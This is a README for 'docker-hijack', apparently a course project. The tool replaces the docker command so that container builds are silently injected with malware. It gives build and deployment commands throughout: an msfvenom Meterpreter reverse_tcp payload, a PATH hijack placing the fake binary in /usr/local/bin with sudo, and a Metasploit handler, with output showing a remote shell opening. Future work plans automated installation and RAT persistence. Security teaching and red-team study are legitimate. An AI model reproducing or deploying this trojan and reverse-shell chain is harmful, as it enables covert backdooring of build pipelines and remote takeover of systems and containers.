# docker-hijack

Docker-hijack demonstrates how an adversary could hijack the docker build process to embed malware in container images.

This tool is intended for use by ethical security practitioners to assess and improve cybersecurity.

Misuse of this tool is strongly condemned by the author.

This tool was created to satisfy classwork for Dakota State University's CSC-842 Security Tool Development.

[image](media/docker-hijack.drawio.png)

## Prerequisites

- GNU/Linux-based Operating System
- Go compiler
- Docker
- Metasploit (optional)

### Usage

### 1. Build from Source

We do not provide pre-compiled versions of this program.

You must first build docker-hijack from source.

Build instructions are as follows:

```bash
# clone the repository
git clone https://github.com/bluesentinelsec/docker-hijack.git

# enter the project folder
cd docker-highjack

# place a meterpreter shell in the payloads folder
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o pkg/payload/meterpreter

# read/change the evil docker-build commands
cat pkg/payload/build_commands.txt

# build docker-highjack with default options
go build -o docker-hijack cmd/main.go

# confirm executable runs; it should proxy
# '--help' to the legitimate docker executable
./docker-hijack --help
```

### 2. Deploy docker-hijack to target Unix-based system

How you do this is up to you.

Never deploy this tool on target systems unless you have explicit written permission from the device owner(s).

### 3. Install docker-hijack on target

You should now have the docker-hijack binary on the target system.

Next, we need to ensure that docker-hijack is executed before the legitimate docker.

There are many ways to do this, such as setting alias commands, or modifying the user's $PATH variable.

For demonstration purposes, you can simply copy the tainted docker to `/usr/local/bin` which is ahead of the legitimate docker executable.

This requires sudo permissions.

```bash
# move docker-hijack to location ahead of docker in $PATH
sudo mv docker-hijack /usr/local/bin
```

Now confirm that docker-hijack is executed:

```bash
docker --infected

you executed docker hijack
```

Now docker-hijack sits between the user and the legitimate docker executable.

### 4. Wait for compromised user to invoke docker build command

Setup a Meterpreter handler; this needs to match the Meterpreter created in `docker-hijack/pkg/payload/meterpreter`:

```
# example meterpreter commands
sudo msfconsole
msf > use exploit/multi/handler
msf > set payload linux/x86/meterpreter/reverse_tcp
msf > set LHOST 0.0.0.0
msf > set LPORT 4444
msf > run -j
[*] Started reverse TCP handler on 0.0.0.0:4444 
```

Now wait... whenever a compromised user invokes docker build, docker-hijack will insert a malicious command into the docker build file.

To test this, run a docker build command against `docker-hijack/testData/Dockerfile`.

```bash
# from docker-hijack/testData/
# build the Dockerfile; docker-hijack will intercept the command
# and inject the Dockerfile; once the build is finished, docker-hijack
# will restore the original build file
docker build . -t compromised
```

Finally, execute the container.

If it worked, you should get a shell.

```bash
docker exec -it compromised bash
```

```bash
msf6 exploit(multi/handler) > [*] Sending stage (1017704 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.1.153:4444 -> 172.17.0.2:41404) at 2023-05-31 18:39:01 -0400
```

### 5. Cleanup

Remove docker-hijack:

```
# delete docker-hijack
rm -rf /usr/local/bin/docker

# stop/delete tainted container image
docker ps
docker stop <tainted container ID>

docker images
docker rmi infected --force
```

## Future Work

Given enough time, I would pursue the following features:

1. Automate docker-hijack installation

2. Deploy the embedded payload as a service/daemon. This should make the payload fire when the container is executed detatched. Cron job is another option; however, containers don't always have cron installed.

3. Make it easier to specify your payloads at build time. Ideally it should be:

```bash
make payload_src=/path/to/your_rat \
     payload_dst=/usr/local/bin/your_rat \
     build_cmds=/path/to/your_build_cmds.txt
```

